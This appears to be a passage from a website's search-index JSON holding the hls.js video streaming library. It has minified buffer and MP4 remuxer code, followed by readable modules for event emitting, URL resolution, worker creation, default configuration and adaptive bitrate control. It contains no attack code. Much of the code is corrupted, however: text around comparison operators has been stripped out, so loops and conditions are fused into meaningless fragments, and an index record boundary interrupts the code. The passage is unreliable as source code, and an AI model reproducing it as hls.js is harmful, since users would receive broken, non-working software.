\"+this.media.currentTime.toFixed(3)+\"/\"+e+\"/\"+t),this.flushBufferCounter.5)return this.flushBufferCounter++,c.logger.log(\"flush \"+d+\" [\"+o+\",\"+l+\"], of [\"+n+\",\"+s+\"], pos:\"+this.media.currentTime),i.remove(o,l),!1}catch(e){c.logger.warn(\"exception while accessing sourcebuffer, it might have been removed from MediaSource\")}}}else c.logger.warn(\"abort flushing too many retries\");c.logger.log(\"buffer flushed\")}return!0}}]),t}(f.default);r.default=g},{30:30,31:31,32:32,50:50}],9:[function(e,t,r){\"use strict\";function i(e){return e&&e.__esModule?e:{default:e}}function a(e,t){if(!(e instanceof t))throw new TypeError(\"Cannot call a class as a function\")}function n(e,t){if(!e)throw new ReferenceError(\"this hasn't been initialised - super() hasn't been called\");return!t||\"object\"!=typeof t&&\"function\"!=typeof t?e:t}function s(e,t){if(\"function\"!=typeof t&&null!==t)throw new TypeError(\"Super expression must either be null or a function, not \"+typeof t);e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}),t&&(Object.setPrototypeOf?Object.setPrototypeOf(e,t):e.__proto__=t)}Object.defineProperty(r,\"__esModule\",{value:!0});var o=function(){function e(e,t){for(var r=0;rthis.autoLevelCapping&&t.streamController.nextLevelSwitch(),this.autoLevelCapping=t.autoLevelCapping}}}},{key:\"getMaxLevel\",value:function(e){var t=0,r=void 0,i=void 0,a=this.mediaWidth,n=this.mediaHeight,s=0,o=0;for(r=0;r24,l>>16&255,l>>8&255,255&l,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,0,a>>8&255,255&a,0,0,s>>8&255,255&s,0,0]))}},{key:\"traf\",value:function(t,r){var i=e.sdtp(t),a=t.id,s=Math.floor(r/(n+1)),o=Math.floor(r%(n+1));return e.box(e.types.traf,e.box(e.types.tfhd,new Uint8Array([0,0,0,0,a>>24,a>>16&255,a>>8&255,255&a])),e.box(e.types.tfdt,new Uint8Array([1,0,0,0,s>>24,s>>16&255,s>>8&255,255&s,o>>24,o>>16&255,o>>8&255,255&o])),e.trun(t,i.length+16+20+8+16+8+8),i)}},{key:\"trak\",value:function(t){return t.duration=t.duration||4294967295,e.box(e.types.trak,e.tkhd(t),e.mdia(t))}},{key:\"trex\",value:function(t){var r=t.id;return e.box(e.types.trex,new Uint8Array([0,0,0,0,r>>24,r>>16&255,r>>8&255,255&r,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0,1]))}},{key:\"trun\",value:function(t,r){var i,a,n,s,o,l,u=t.samples||[],d=u.length,f=12+16*d,c=new Uint8Array(f);for(r+=8+f,c.set([0,0,15,1,d>>>24&255,d>>>16&255,d>>>8&255,255&d,r>>>24&255,r>>>16&255,r>>>8&255,255&r],0),i=0;i>>24&255,n>>>16&255,n>>>8&255,255&n,s>>>24&255,s>>>16&255,s>>>8&255,255&s,o.isLeading>8&255,255&l],12+16*i);return e.box(e.types.trun,c)}},{key:\"initSegment\",value:function(t){e.types||e.init();var r,i=e.moov(t);return r=new Uint8Array(e.FTYP.byteLength+i.byteLength),r.set(e.FTYP),r.set(i,e.FTYP.byteLength),r}}]),e}();r.default=s},{}],42:[function(e,t,r){\"use strict\";function i(e){return e&&e.__esModule?e:{default:e}}function a(e,t){if(!(e instanceof t))throw new TypeError(\"Cannot call a class as a function\")}Object.defineProperty(r,\"__esModule\",{value:!0});var n=function(){function e(e,t){for(var r=0;r-1&&s&&!s.match(\"CriOS\"),this.ISGenerated=!1}return n(e,[{key:\"destroy\",value:function(){}},{key:\"resetTimeStamp\",value:function(e){this._initPTS=this._initDTS=e}},{key:\"resetInitSegment\",value:function(){this.ISGenerated=!1}},{key:\"remux\",value:function(e,t,r,i,a,n,s){if(this.ISGenerated||this.generateIS(e,t,a),this.ISGenerated)if(e.samples.length){var o=this.remuxAudio(e,a,n,s);if(t.samples.length){var l=void 0;o&&(l=o.endPTS-o.startPTS),this.remuxVideo(t,a,n,l)}}else{var d=void 0;t.samples.length&&(d=this.remuxVideo(t,a,n)),d&&e.codec&&this.remuxEmptyAudio(e,a,n,d)}r.samples.length&&this.remuxID3(r,a),i.samples.length&&this.remuxText(i,a),this.observer.trigger(u.default.FRAG_PARSED)}},{key:\"generateIS\",value:function(e,t,r){var i,a,n=this.observer,s=e.samples,o=t.samples,l=this.typeSupported,f=\"audio/mp4\",g={},v={tracks:g},p=void 0===this._initPTS;if(p&&(i=a=1/0),e.config&&s.length&&(e.timescale=e.samplerate,d.logger.log(\"audio sampling rate : \"+e.samplerate),e.isAAC||(l.mpeg?(f=\"audio/mpeg\",e.codec=\"\"):l.mp3&&(e.codec=\"mp3\")),g.audio={container:f,codec:e.codec,initSegment:!e.isAAC&&l.mpeg?new Uint8Array:c.default.initSegment([e]),metadata:{channelCount:e.channelCount}},p&&(i=a=s[0].pts-e.inputTimeScale*r)),t.sps&&t.pps&&o.length){var y=t.inputTimeScale;t.timescale=y,g.video={container:\"video/mp4\",codec:t.codec,initSegment:c.default.initSegment([t]),metadata:{width:t.width,height:t.height}},p&&(i=Math.min(i,o[0].pts-y*r),a=Math.min(a,o[0].dts-y*r),this.observer.trigger(u.default.INIT_PTS_FOUND,{initPTS:i}))}Object.keys(g).length?(n.trigger(u.default.FRAG_PARSING_INIT_SEGMENT,v),this.ISGenerated=!0,p&&(this._initPTS=i,this._initDTS=a)):n.trigger(u.default.ERROR,{type:h.ErrorTypes.MEDIA_ERROR,details:h.ErrorDetails.FRAG_PARSING_ERROR,fatal:!1,reason:\"no audio/video samples found\"})}},{key:\"remuxVideo\",value:function(e,t,r,i){var a,n,s,o,l,f,g,v=8,p=e.timescale,y=e.samples,m=[],E=y.length,b=this._PTSNormalize,T=this._initDTS;y.sort(function(e,t){var r=e.dts-t.dts,i=e.pts-t.pts;return r?r:i?i:e.id-t.id});var _=y.reduce(function(e,t){return Math.max(Math.min(e,t.pts-t.dts),-18e3)},0);if(_1?d.logger.log(\"AVC:\"+S+\" ms hole between fragments detected,filling it\"):S0?U-1:U].dts;if(q.stretchShortVideoTrack){var Q=q.maxBufferHole,J=q.maxSeekHole,Z=Math.floor(Math.min(Q,J)*p),$=(i?o+i*p:this.nextAudioPts)-B.pts;$>Z?(a=$-z,a","tags":""},{"title":"","url":"/js/ckplayer/hls/hls.js","text":"(function(f){if(typeof exports===\"object\"&&typeof module!==\"undefined\"){module.exports=f()}else if(typeof define===\"function\"&&define.amd){define([],f)}else{var g;if(typeof window!==\"undefined\"){g=window}else if(typeof global!==\"undefined\"){g=global}else if(typeof self!==\"undefined\"){g=self}else{g=this}g.Hls = f()}})(function(){var define,module,exports;return (function e(t,n,r){function s(o,u){if(!n[o]){if(!t[o]){var a=typeof require==\"function\"&&require;if(!u&&a)return a(o,!0);if(i)return i(o,!0);var f=new Error(\"Cannot find module '\"+o+\"'\");throw f.code=\"MODULE_NOT_FOUND\",f}var l=n[o]={exports:{}};t[o][0].call(l.exports,function(e){var n=t[o][1][e];return s(n?n:e)},l,l.exports,e,t,n,r)}return n[o].exports}var i=typeof require==\"function\"&&require;for(var o=0;o m) { this._events[type].warned = true; console.error('(node) warning: possible EventEmitter memory ' + 'leak detected. %d listeners added. ' + 'Use emitter.setMaxListeners() to increase limit.', this._events[type].length); if (typeof console.trace === 'function') { // not supported in IE 10 console.trace(); } } } return this; }; EventEmitter.prototype.on = EventEmitter.prototype.addListener; EventEmitter.prototype.once = function(type, listener) { if (!isFunction(listener)) throw TypeError('listener must be a function'); var fired = false; function g() { this.removeListener(type, g); if (!fired) { fired = true; listener.apply(this, arguments); } } g.listener = listener; this.on(type, g); return this; }; // emits a 'removeListener' event iff the listener was removed EventEmitter.prototype.removeListener = function(type, listener) { var list, position, length, i; if (!isFunction(listener)) throw TypeError('listener must be a function'); if (!this._events || !this._events[type]) return this; list = this._events[type]; length = list.length; position = -1; if (list === listener || (isFunction(list.listener) && list.listener === listener)) { delete this._events[type]; if (this._events.removeListener) this.emit('removeListener', type, listener); } else if (isObject(list)) { for (i = length; i-- > 0;) { if (list[i] === listener || (list[i].listener && list[i].listener === listener)) { position = i; break; } } if (position < 0) return this; if (list.length === 1) { list.length = 0; delete this._events[type]; } else { list.splice(position, 1); } if (this._events.removeListener) this.emit('removeListener', type, listener); } return this; }; EventEmitter.prototype.removeAllListeners = function(type) { var key, listeners; if (!this._events) return this; // not listening for removeListener, no need to emit if (!this._events.removeListener) { if (arguments.length === 0) this._events = {}; else if (this._events[type]) delete this._events[type]; return this; } // emit removeListener for all listeners on all events if (arguments.length === 0) { for (key in this._events) { if (key === 'removeListener') continue; this.removeAllListeners(key); } this.removeAllListeners('removeListener'); this._events = {}; return this; } listeners = this._events[type]; if (isFunction(listeners)) { this.removeListener(type, listeners); } else if (listeners) { // LIFO order while (listeners.length) this.removeListener(type, listeners[listeners.length - 1]); } delete this._events[type]; return this; }; EventEmitter.prototype.listeners = function(type) { var ret; if (!this._events || !this._events[type]) ret = []; else if (isFunction(this._events[type])) ret = [this._events[type]]; else ret = this._events[type].slice(); return ret; }; EventEmitter.prototype.listenerCount = function(type) { if (this._events) { var evlistener = this._events[type]; if (isFunction(evlistener)) return 1; else if (evlistener) return evlistener.length; } return 0; }; EventEmitter.listenerCount = function(emitter, type) { return emitter.listenerCount(type); }; function isFunction(arg) { return typeof arg === 'function'; } function isNumber(arg) { return typeof arg === 'number'; } function isObject(arg) { return typeof arg === 'object' && arg !== null; } function isUndefined(arg) { return arg === void 0; } },{}],2:[function(_dereq_,module,exports){ // see https://tools.ietf.org/html/rfc1808 /* jshint ignore:start */ (function(root) { /* jshint ignore:end */ var URL_REGEX = /^((?:[^\\/;?#]+:)?)(\\/\\/[^\\/\\;?#]*)?(.*?)??(;.*?)?(\\?.*?)?(#.*?)?$/; var FIRST_SEGMENT_REGEX = /^([^\\/;?#]*)(.*)$/; var SLASH_DOT_REGEX = /(?:\\/|^)\\.(?=\\/)/g; var SLASH_DOT_DOT_REGEX = /(?:\\/|^)\\.\\.\\/(?!\\.\\.\\/).*?(?=\\/)/g; var URLToolkit = { // jshint ignore:line // If opts.alwaysNormalize is true then the path will always be normalized even when it starts with / or // // E.g // With opts.alwaysNormalize = false (default, spec compliant) // http://a.com/b/cd + /e/f/../g => http://a.com/e/f/../g // With opts.alwaysNormalize = true (default, not spec compliant) // http://a.com/b/cd + /e/f/../g => http://a.com/e/g buildAbsoluteURL: function(baseURL, relativeURL, opts) { opts = opts || {}; // remove any remaining space and CRLF baseURL = baseURL.trim(); relativeURL = relativeURL.trim(); if (!relativeURL) { // 2a) If the embedded URL is entirely empty, it inherits the // entire base URL (i.e., is set equal to the base URL) // and we are done. if (!opts.alwaysNormalize) { return baseURL; } var basePartsForNormalise = this.parseURL(baseURL); if (!baseParts) { throw new Error('Error trying to parse base URL.'); } basePartsForNormalise.path = URLToolkit.normalizePath(basePartsForNormalise.path); return URLToolkit.buildURLFromParts(basePartsForNormalise); } var relativeParts = this.parseURL(relativeURL); if (!relativeParts) { throw new Error('Error trying to parse relative URL.'); } if (relativeParts.scheme) { // 2b) If the embedded URL starts with a scheme name, it is // interpreted as an absolute URL and we are done. if (!opts.alwaysNormalize) { return relativeURL; } relativeParts.path = URLToolkit.normalizePath(relativeParts.path); return URLToolkit.buildURLFromParts(relativeParts); } var baseParts = this.parseURL(baseURL); if (!baseParts) { throw new Error('Error trying to parse base URL.'); } if (!baseParts.netLoc && baseParts.path && baseParts.path[0] !== '/') { // If netLoc missing and path doesn't start with '/', assume everthing before the first '/' is the netLoc // This causes 'example.com/a' to be handled as '//example.com/a' instead of '/example.com/a' var pathParts = FIRST_SEGMENT_REGEX.exec(baseParts.path); baseParts.netLoc = pathParts[1]; baseParts.path = pathParts[2]; } if (baseParts.netLoc && !baseParts.path) { baseParts.path = '/'; } var builtParts = { // 2c) Otherwise, the embedded URL inherits the scheme of // the base URL. scheme: baseParts.scheme, netLoc: relativeParts.netLoc, path: null, params: relativeParts.params, query: relativeParts.query, fragment: relativeParts.fragment }; if (!relativeParts.netLoc) { // 3) If the embedded URL's is non-empty, we skip to // Step 7. Otherwise, the embedded URL inherits the // (if any) of the base URL. builtParts.netLoc = baseParts.netLoc; // 4) If the embedded URL path is preceded by a slash \"/\", the // path is not relative and we skip to Step 7. if (relativeParts.path[0] !== '/') { if (!relativeParts.path) { // 5) If the embedded URL path is empty (and not preceded by a // slash), then the embedded URL inherits the base URL path builtParts.path = baseParts.path; // 5a) if the embedded URL's is non-empty, we skip to // step 7; otherwise, it inherits the of the base // URL (if any) and if (!relativeParts.params) { builtParts.params = baseParts.params; // 5b) if the embedded URL's is non-empty, we skip to // step 7; otherwise, it inherits the of the base // URL (if any) and we skip to step 7. if (!relativeParts.query) { builtParts.query = baseParts.query; } } } else { // 6) The last segment of the base URL's path (anything // following the rightmost slash \"/\", or the entire path if no // slash is present) is removed and the embedded URL's path is // appended in its place. var baseURLPath = baseParts.path; var newPath = baseURLPath.substring(0, baseURLPath.lastIndexOf('/') + 1) + relativeParts.path; builtParts.path = URLToolkit.normalizePath(newPath); } } } if (builtParts.path === null) { builtParts.path = opts.alwaysNormalize ? URLToolkit.normalizePath(relativeParts.path) : relativeParts.path; } return URLToolkit.buildURLFromParts(builtParts); }, parseURL: function(url) { var parts = URL_REGEX.exec(url); if (!parts) { return null; } return { scheme: parts[1] || '', netLoc: parts[2] || '', path: parts[3] || '', params: parts[4] || '', query: parts[5] || '', fragment: parts[6] || '' }; }, normalizePath: function(path) { // The following operations are // then applied, in order, to the new path: // 6a) All occurrences of \"./\", where \".\" is a complete path // segment, are removed. // 6b) If the path ends with \".\" as a complete path segment, // that \".\" is removed. path = path.split('').reverse().join('').replace(SLASH_DOT_REGEX, ''); // 6c) All occurrences of \"/../\", where is a // complete path segment not equal to \"..\", are removed. // Removal of these path segments is performed iteratively, // removing the leftmost matching pattern on each iteration, // until no matching pattern remains. // 6d) If the path ends with \"/..\", where is a // complete path segment not equal to \"..\", that // \"/..\" is removed. while (path.length !== (path = path.replace(SLASH_DOT_DOT_REGEX, '')).length) {} // jshint ignore:line return path.split('').reverse().join(''); }, buildURLFromParts: function(parts) { return parts.scheme + parts.netLoc + parts.path + parts.params + parts.query + parts.fragment; } }; /* jshint ignore:start */ if(typeof exports === 'object' && typeof module === 'object') module.exports = URLToolkit; else if(typeof define === 'function' && define.amd) define([], function() { return URLToolkit; }); else if(typeof exports === 'object') exports[\"URLToolkit\"] = URLToolkit; else root[\"URLToolkit\"] = URLToolkit; })(this); /* jshint ignore:end */ },{}],3:[function(_dereq_,module,exports){ var bundleFn = arguments[3]; var sources = arguments[4]; var cache = arguments[5]; var stringify = JSON.stringify; module.exports = function (fn, options) { var wkey; var cacheKeys = Object.keys(cache); for (var i = 0, l = cacheKeys.length; i < l; i++) { var key = cacheKeys[i]; var exp = cache[key].exports; // Using babel as a transpiler to use esmodule, the export will always // be an object with the default export as a property of it. To ensure // the existing api and babel esmodule exports are both supported we // check for both if (exp === fn || exp && exp.default === fn) { wkey = key; break; } } if (!wkey) { wkey = Math.floor(Math.pow(16, 8) * Math.random()).toString(16); var wcache = {}; for (var i = 0, l = cacheKeys.length; i < l; i++) { var key = cacheKeys[i]; wcache[key] = key; } sources[wkey] = [ Function(['require','module','exports'], '(' + fn + ')(self)'), wcache ]; } var skey = Math.floor(Math.pow(16, 8) * Math.random()).toString(16); var scache = {}; scache[wkey] = wkey; sources[skey] = [ Function(['require'], ( // try to call default if defined to also support babel esmodule // exports 'var f = require(' + stringify(wkey) + ');' + '(f.default ? f.default : f)(self);' )), scache ]; var workerSources = {}; resolveSources(skey); function resolveSources(key) { workerSources[key] = true; for (var depPath in sources[key][1]) { var depKey = sources[key][1][depPath]; if (!workerSources[depKey]) { resolveSources(depKey); } } } var src = '(' + bundleFn + ')({' + Object.keys(workerSources).map(function (key) { return stringify(key) + ':[' + sources[key][0] + ',' + stringify(sources[key][1]) + ']' ; }).join(',') + '},{},[' + stringify(skey) + '])' ; var URL = window.URL || window.webkitURL || window.mozURL || window.msURL; var blob = new Blob([src], { type: 'text/javascript' }); if (options && options.bare) { return blob; } var workerUrl = URL.createObjectURL(blob); var worker = new Worker(workerUrl); worker.objectURL = workerUrl; return worker; }; },{}],4:[function(_dereq_,module,exports){ /** * HLS config */ 'use strict'; Object.defineProperty(exports, \"__esModule\", { value: true }); exports.hlsDefaultConfig = undefined; var _abrController = _dereq_(5); var _abrController2 = _interopRequireDefault(_abrController); var _bufferController = _dereq_(8); var _bufferController2 = _interopRequireDefault(_bufferController); var _capLevelController = _dereq_(9); var _capLevelController2 = _interopRequireDefault(_capLevelController); var _fpsController = _dereq_(10); var _fpsController2 = _interopRequireDefault(_fpsController); var _xhrLoader = _dereq_(55); var _xhrLoader2 = _interopRequireDefault(_xhrLoader); var _audioTrackController = _dereq_(7); var _audioTrackController2 = _interopRequireDefault(_audioTrackController); var _audioStreamController = _dereq_(6); var _audioStreamController2 = _interopRequireDefault(_audioStreamController); var _cues = _dereq_(47); var _cues2 = _interopRequireDefault(_cues); var _timelineController = _dereq_(15); var _timelineController2 = _interopRequireDefault(_timelineController); var _subtitleTrackController = _dereq_(14); var _subtitleTrackController2 = _interopRequireDefault(_subtitleTrackController); var _subtitleStreamController = _dereq_(13); var _subtitleStreamController2 = _interopRequireDefault(_subtitleStreamController); function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; } //#endif //#endif //#if subtitle //import FetchLoader from './utils/fetch-loader'; //#if altaudio var hlsDefaultConfig = exports.hlsDefaultConfig = { autoStartLoad: true, // used by stream-controller startPosition: -1, // used by stream-controller defaultAudioCodec: undefined, // used by stream-controller debug: false, // used by logger capLevelOnFPSDrop: false, // used by fps-controller capLevelToPlayerSize: false, // used by cap-level-controller initialLiveManifestSize: 1, // used by stream-controller maxBufferLength: 30, // used by stream-controller maxBufferSize: 60 * 1000 * 1000, // used by stream-controller maxBufferHole: 0.5, // used by stream-controller maxSeekHole: 2, // used by stream-controller lowBufferWatchdogPeriod: 0.5, // used by stream-controller highBufferWatchdogPeriod: 3, // used by stream-controller nudgeOffset: 0.1, // used by stream-controller nudgeMaxRetry: 3, // used by stream-controller maxFragLookUpTolerance: 0.2, // used by stream-controller liveSyncDurationCount: 3, // used by stream-controller liveMaxLatencyDurationCount: Infinity, // used by stream-controller liveSyncDuration: undefined, // used by stream-controller liveMaxLatencyDuration: undefined, // used by stream-controller maxMaxBufferLength: 600, // used by stream-controller enableWorker: true, // used by demuxer enableSoftwareAES: true, // used by decrypter manifestLoadingTimeOut: 10000, // used by playlist-loader manifestLoadingMaxRetry: 1, // used by playlist-loader manifestLoadingRetryDelay: 1000, // used by playlist-loader manifestLoadingMaxRetryTimeout: 64000, // used by playlist-loader startLevel: undefined, // used by level-controller levelLoadingTimeOut: 10000, // used by playlist-loader levelLoadingMaxRetry: 4, // used by playlist-loader levelLoadingRetryDelay: 1000, // used by playlist-loader levelLoadingMaxRetryTimeout: 64000, // used by playlist-loader fragLoadingTimeOut: 20000, // used by fragment-loader fragLoadingMaxRetry: 6, // used by fragment-loader fragLoadingRetryDelay: 1000, // used by fragment-loader fragLoadingMaxRetryTimeout: 64000, // used by fragment-loader fragLoadingLoopThreshold: 3, // used by stream-controller startFragPrefetch: false, // used by stream-controller fpsDroppedMonitoringPeriod: 5000, // used by fps-controller fpsDroppedMonitoringThreshold: 0.2, // used by fps-controller appendErrorMaxRetry: 3, // used by buffer-controller loader: _xhrLoader2.default, //loader: FetchLoader, fLoader: undefined, pLoader: undefined, xhrSetup: undefined, fetchSetup: undefined, abrController: _abrController2.default, bufferController: _bufferController2.default, capLevelController: _capLevelController2.default, fpsController: _fpsController2.default, //#if altaudio audioStreamController: _audioStreamController2.default, audioTrackController: _audioTrackController2.default, //#endif //#if subtitle subtitleStreamController: _subtitleStreamController2.default, subtitleTrackController: _subtitleTrackController2.default, timelineController: _timelineController2.default, cueHandler: _cues2.default, enableCEA708Captions: true, // used by timeline-controller enableWebVTT: true, // used by timeline-controller captionsTextTrack1Label: 'English', // used by timeline-controller captionsTextTrack1LanguageCode: 'en', // used by timeline-controller captionsTextTrack2Label: 'Spanish', // used by timeline-controller captionsTextTrack2LanguageCode: 'es', // used by timeline-controller //#endif stretchShortVideoTrack: false, // used by mp4-remuxer forceKeyFrameOnDiscontinuity: true, // used by ts-demuxer abrEwmaFastLive: 3, // used by abr-controller abrEwmaSlowLive: 9, // used by abr-controller abrEwmaFastVoD: 3, // used by abr-controller abrEwmaSlowVoD: 9, // used by abr-controller abrEwmaDefaultEstimate: 5e5, // 500 kbps // used by abr-controller abrBandWidthFactor: 0.95, // used by abr-controller abrBandWidthUpFactor: 0.7, // used by abr-controller abrMaxWithRealBitrate: false, // used by abr-controller maxStarvationDelay: 4, // used by abr-controller maxLoadingDelay: 4, // used by abr-controller minAutoBitrate: 0 // used by hls }; },{\"10\":10,\"13\":13,\"14\":14,\"15\":15,\"47\":47,\"5\":5,\"55\":55,\"6\":6,\"7\":7,\"8\":8,\"9\":9}],5:[function(_dereq_,module,exports){ 'use strict'; Object.defineProperty(exports, \"__esModule\", { value: true }); var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if (\"value\" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }(); var _events = _dereq_(32); var _events2 = _interopRequireDefault(_events); var _eventHandler = _dereq_(31); var _eventHandler2 = _interopRequireDefault(_eventHandler); var _bufferHelper = _dereq_(34); var _bufferHelper2 = _interopRequireDefault(_bufferHelper); var _errors = _dereq_(30); var _logger = _dereq_(50); var _ewmaBandwidthEstimator = _dereq_(48); var _ewmaBandwidthEstimator2 = _interopRequireDefault(_ewmaBandwidthEstimator); function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; } function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError(\"Cannot call a class as a function\"); } } function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError(\"this hasn't been initialised - super() hasn't been called\"); } return call && (typeof call === \"object\" || typeof call === \"function\") ? call : self; } function _inherits(subClass, superClass) { if (typeof superClass !== \"function\" && superClass !== null) { throw new TypeError(\"Super expression must either be null or a function, not \" + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; } /* * simple ABR Controller * - compute next level based on last fragment bw heuristics * - implement an abandon rules triggered if we have less than 2 frag buffered and if computed bw shows that we risk buffer stalling */ var AbrController = function (_EventHandler) { _inherits(AbrController, _EventHandler); function AbrController(hls) { _classCallCheck(this, AbrController); var _this = _possibleConstructorReturn(this, (AbrController.__proto__ || Object.getPrototypeOf(AbrController)).call(this, hls, _events2.default.FRAG_LOADING, _events2.default.FRAG_LOADED, _events2.default.FRAG_BUFFERED, _events2.default.ERROR)); _this.lastLoadedFragLevel = 0; _this._nextAutoLevel = -1; _this.hls = hls; _this.onCheck = _this._abandonRulesCheck.bind(_this); return _this; } _createClass(AbrController, [{ key: 'destroy', value: function destroy() { this.clearTimer(); _eventHandler2.default.prototype.destroy.call(this); } }, { key: 'onFragLoading', value: function onFragLoading(data) { var frag = data.frag; if (frag.type === 'main') { if (!this.timer) { this.timer = setInterval(this.onCheck, 100); } // lazy init of bw Estimator, rationale is that we use different params for Live/VoD // so we need to wait for stream manifest / playlist type to instantiate it. if (!this._bwEstimator) { var hls = this.hls, level = data.frag.level, isLive = hls.levels[level].details.live, config = hls.config, ewmaFast = void 0, ewmaSlow = void 0; if (isLive) { ewmaFast = config.abrEwmaFastLive; ewmaSlow = config.abrEwmaSlowLive; } else { ewmaFast = config.abrEwmaFastVoD; ewmaSlow = config.abrEwmaSlowVoD; } this._bwEstimator = new _ewmaBandwidthEstimator2.default(hls, ewmaSlow, ewmaFast, config.abrEwmaDefaultEstimate); } this.fragCurrent = frag; } } }, { key: '_abandonRulesCheck', value: function _abandonRulesCheck() { /* monitor fragment retrieval time... we compute expected time of arrival of the complete fragment. we compare it to expected time of buffer starvation */ var hls = this.hls, v = hls.media, frag = this.fragCurrent, loader = frag.loader, minAutoLevel = hls.minAutoLevel; // if loader has been destroyed or loading has been aborted, stop timer and return if (!loader || loader.stats && loader.stats.aborted) { _logger.logger.warn('frag loader destroy or aborted, disarm abandonRules'); this.clearTimer(); return; } var stats = loader.stats; /* only monitor frag retrieval time if (video not paused OR first fragment being loaded(ready state === HAVE_NOTHING = 0)) AND autoswitching enabled AND not lowest level (=> means that we have several levels) */ if (v && (!v.paused && v.playbackRate !== 0 || !v.readyState) && frag.autoLevel && frag.level) { var requestDelay = performance.now() - stats.trequest, playbackRate = Math.abs(v.playbackRate); // monitor fragment load progress after half of expected fragment duration,to stabilize bitrate if (requestDelay > 500 * frag.duration / playbackRate) { var levels = hls.levels, loadRate = Math.max(1, stats.bw ? stats.bw / 8 : stats.loaded * 1000 / requestDelay), // byte/s; at least 1 byte/s to avoid division by zero // compute expected fragment length using frag duration and level bitrate. also ensure that expected len is gte than already loaded size level = levels[frag.level], levelBitrate = level.realBitrate ? Math.max(level.realBitrate, level.bitrate) : level.bitrate, expectedLen = stats.total ? stats.total : Math.max(stats.loaded, Math.round(frag.duration * levelBitrate / 8)), pos = v.currentTime, fragLoadedDelay = (expectedLen - stats.loaded) / loadRate, bufferStarvationDelay = (_bufferHelper2.default.bufferInfo(v, pos, hls.config.maxBufferHole).end - pos) / playbackRate; // consider emergency switch down only if we have less than 2 frag buffered AND // time to finish loading current fragment is bigger than buffer starvation delay // ie if we risk buffer starvation if bw does not increase quickly if (bufferStarvationDelay < 2 * frag.duration / playbackRate && fragLoadedDelay > bufferStarvationDelay) { var fragLevelNextLoadedDelay = void 0, nextLoadLevel = void 0; // lets iterate through lower level and try to find the biggest one that could avoid rebuffering // we start from current level - 1 and we step down , until we find a matching level for (nextLoadLevel = frag.level - 1; nextLoadLevel > minAutoLevel; nextLoadLevel--) { // compute time to load next fragment at lower level // 0.8 : consider only 80% of current bw to be conservative // 8 = bits per byte (bps/Bps) var levelNextBitrate = levels[nextLoadLevel].realBitrate ? Math.max(levels[nextLoadLevel].realBitrate, levels[nextLoadLevel].bitrate) : levels[nextLoadLevel].bitrate; fragLevelNextLoadedDelay = frag.duration * levelNextBitrate / (8 * 0.8 * loadRate); if (fragLevelNextLoadedDelay < bufferStarvationDelay) { // we found a lower level that be rebuffering free with current estimated bw ! break; } } // only emergency switch down if it takes less time to load new fragment at lowest level instead // of finishing loading current one ... if (fragLevelNextLoadedDelay < fragLoadedDelay) { _logger.logger.warn('loading too slow, abort fragment loading and switch to level ' + nextLoadLevel + ':fragLoadedDelay[' + nextLoadLevel + ']= 0) { return bestLevel; } else { _logger.logger.trace('rebuffering expected to happen, lets try to find a quality level minimizing the rebuffering'); // not possible to get rid of rebuffering ... let's try to find level that will guarantee less than maxStarvationDelay of rebuffering // if no matching level found, logic will return 0 var maxStarvationDelay = currentFragDuration ? Math.min(currentFragDuration, config.maxStarvationDelay) : config.maxStarvationDelay, bwFactor = config.abrBandWidthFactor, bwUpFactor = config.abrBandWidthUpFactor; if (bufferStarvationDelay === 0) { // in case buffer is empty, let's check if previous fragment was loaded to perform a bitrate test var bitrateTestDelay = this.bitrateTestDelay; if (bitrateTestDelay) { // if it is the case, then we need to adjust our max starvation delay using maxLoadingDelay config value // max video loading delay used in automatic start level selection : // in that mode ABR controller will ensure that video loading time (ie the time to fetch the first fragment at lowest quality level + // the time to fetch the fragment at the appropriate quality level is less than ```maxLoadingDelay``` ) // cap maxLoadingDelay and ensure it is not bigger 'than bitrate test' frag duration var maxLoadingDelay = currentFragDuration ? Math.min(currentFragDuration, config.maxLoadingDelay) : config.maxLoadingDelay; maxStarvationDelay = maxLoadingDelay - bitrateTestDelay; _logger.logger.trace('bitrate test took ' + Math.round(1000 * bitrateTestDelay) + 'ms, set first fragment max fetchDuration to ' + Math.round(1000 * maxStarvationDelay) + ' ms'); // don't use conservative factor on bitrate test bwFactor = bwUpFactor = 1; } } bestLevel = this._findBestLevel(currentLevel, currentFragDuration, avgbw, minAutoLevel, maxAutoLevel, bufferStarvationDelay + maxStarvationDelay, bwFactor, bwUpFactor, levels); return Math.max(bestLevel, 0); } } }]); return AbrController; }(_eventHandler2.default); exports.default = AbrController; },{\"30\":30,\"31\":31,\"32\":32,\"34\":34,\"48\":48,\"50\":50}],6:[function(_dereq_,module,exports){ 'use strict'; Object.defineProperty(exports, \"__esModule\", { value: true }); var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if (\"value\" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }(); var _binarySearch = _dereq_(45); var _binarySearch2 = _interopRequireDefault(_binarySearch); var _bufferHelper = _dereq_(34); var _bufferHelper2 = _interopRequireDefault(_bufferHelper); var _demuxer = _dereq_(24); var _demuxer2 = _interopRequireDefault(_demuxer); var _events = _dereq_(32); var _events2 = _interopRequireDefault(_events); var _eventHandler = _dereq_(31); var _eventHandler2 